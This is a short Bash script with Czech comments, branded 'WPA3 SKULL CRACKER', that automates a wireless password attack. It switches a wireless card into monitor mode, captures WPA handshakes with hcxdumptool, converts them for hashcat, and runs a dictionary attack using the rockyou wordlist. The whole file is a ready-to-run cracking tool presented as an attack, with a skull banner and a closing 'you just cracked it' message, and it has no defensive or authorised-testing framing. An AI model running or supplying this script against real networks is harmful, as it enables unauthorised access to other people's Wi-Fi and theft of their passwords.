#!/bin/bash

# 🎨 Barvy
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'

# 💀 ASCII lebka
show_skull() {
echo -e "${RED}"
cat << "EOF"
 _______   ________      _________.____     ________________________________ 
 \      \  \_____  \    /   _____/|    |    \_   _____/\_   _____/\______   \
 /   |   \  /   |   \   \_____  \ |    |     |    __)_  |    __)_  |     ___/
/    |    \/    |    \  /        \|    |___  |        \ |        \ |    |    
\____|__  /\_______  / /_______  /|_______ \/_______  //_______  / |____|    
        \/         \/          \/         \/        \/         \/            

           🔥 WPA3 SKULL CRACKER 🔥
EOF
echo -e "${RESET}"
}

# ✅ Kontrola sudo
if [[ "$EUID" -ne 0 ]]; then
  echo -e "${RED}[!] Tento skript musíš spustit jako root (sudo).${RESET}"
  exit 1
fi

# 🔰 Banner
clear
show_skull
sleep 1

# Nastavení
iface="wlan0"
mon_iface="${iface}mon"
capture_file="skull_wpa3.pcapng"
converted_hash="skull_wpa3.22000"

# Monitor mód
echo -e "${YELLOW}[→] Přepínám $iface do monitor módu...${RESET}"
airmon-ng check kill
airmon-ng start $iface
sleep 2

# Zachycení
echo -e "${CYAN}[★] Zachytávám WPA3 SAE handshake pomocí hcxdumptool... (časový limit 60s)${RESET}"
timeout 60s hcxdumptool -i $mon_iface -o $capture_file --enable_status=15

# Převod
echo -e "${YELLOW}[→] Převádím pcapng na .22000 pro hashcat...${RESET}"
hcxpcapngtool -o $converted_hash $capture_file

# Crackování
echo -e "${GREEN}[⚔] Spouštím hashcat – zahajuji útok...${RESET}"
sleep 1
hashcat -m 22000 -a 0 -w 3 $converted_hash /usr/share/wordlists/rockyou.txt

# Obnovení sítě
echo -e "${YELLOW}[→] Vypínám monitor mód a obnovuji síťové služby...${RESET}"
airmon-ng stop $mon_iface
systemctl restart NetworkManager
sleep 1

# Výstup
echo -e "${GREEN}[✔] Hotovo! Pokud bylo heslo ve slovníku, právě jsi ho zlomil.${RESET}"
